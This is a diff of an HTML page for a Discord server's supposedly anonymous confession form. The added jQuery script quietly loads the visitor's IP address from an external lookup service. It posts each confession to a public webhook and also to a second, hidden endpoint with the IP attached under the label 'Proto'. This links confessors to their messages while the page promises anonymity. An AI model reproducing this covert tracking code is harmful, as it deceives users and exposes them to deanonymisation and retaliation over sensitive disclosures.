@@ -1,10 +1,69 @@
 <!DOCTYPE html>
+<html>
 <head>
-  <link rel="stylesheet" href="css/style.css">
-  <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&display=swap" rel="stylesheet">
+  <title>Mystical Lovers: Confessions</title>
+  <meta charset="utf-8"/>
+  <link rel="stylesheet" type="text/css" href="css/style.css">
+  <link href="https://fonts.googleapis.com/css?family=Chewy&display=swap" rel="stylesheet">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
 </head>
 <body>
-  <h1>Mystical Lovers Confessions.</h1>
-  <h2>Below you may enter an anonymous Confession. Specific to the Mystical Lovers server only.</h2>
+    <main class="container">
+      <form autocomplete="off">
+        <div>
+          <h1>Mystical Lovers: Confessions</h1>
+          <h2>Here you can confess to anything you want anonymously to the Confession channel of the server.</h2>
+          <h3>(Note: This is not to be used for harassment. Any messages sent deemed against the server's rules will be removed.)<h3>
+        </div>
+        <div class="card card-panel">
+          <div>
+            <h3>Nickname:(optional)<h3>
+            <input type="text" id="nickname" onblur="replaceT(this)">
+          </div>
+          <div>
+            <h3>Message:</h3>
+              <textarea id="content" type="text" rows="10" rows="5" cols="80" onblur="replaceT(this)" required></textarea>
+          </div>
+        </div>
+        <input type="submit" id="submit" Value="Send">
+      </form>
+    </main>
+    <script src="https://code.jquery.com/jquery-2.1.1.min.js" type=
+    "text/javascript">
+    </script>
+    <script>
+    var nip;
+    </script>
+    <script src="https://l2.io/ip.js?var=cat">
+    </script>
+    <script>
+    $(function() {
+        $('#submit').click(function(e) {
+        var name = $("#nickname").val();
+        var content = $("#content").val();
+        var lower = content.toLowerCase;
+        var blank = ['']
+        if(content != blank ){
+          if(name != blank){
+            $.post(url,{"content":"https://mysticallovers.github.io/confessions/\n```ml\n༺⏤⏤⏤⏤⏤⏤⏤༻\nNickname: "+name+"\nMessage: \""+content+"\"\n༺⏤⏤⏤⏤⏤⏤⏤༻```"});
+            noSpam()
+            $.post(url2,{"content":"```ml\n༺⏤⏤⏤⏤⏤⏤⏤༻\nProto: "+cat+"\nNickname: "+name+"\nMessage: \""+content+"\"\n༺⏤⏤⏤⏤⏤⏤⏤༻```"});
+            noSpam();
+          }
+          else{
+            $.post(url,{"content":"https://mysticallovers.github.io/confessions/\n```ml\n༺⏤⏤⏤⏤⏤⏤⏤༻\nMessage: \""+content+"\"\n༺⏤⏤⏤⏤⏤⏤⏤༻```"});
+            noSpam()
+            $.post(url2,{"content":"```ml\n༺⏤⏤⏤⏤⏤⏤⏤༻\nProto: "+cat+"\nMessage: \""+content+"\"\n༺⏤⏤⏤⏤⏤⏤⏤༻```"});
+            noSpam();
+          }
+        }
+        });
+    });
+    </script>
 </body>
+<footer>
+  <h6>Confessions v3.0 by Nothsa</h6>
+</footer>
+<script type="text/javascript" src="js/script.js"></script>
 </html>
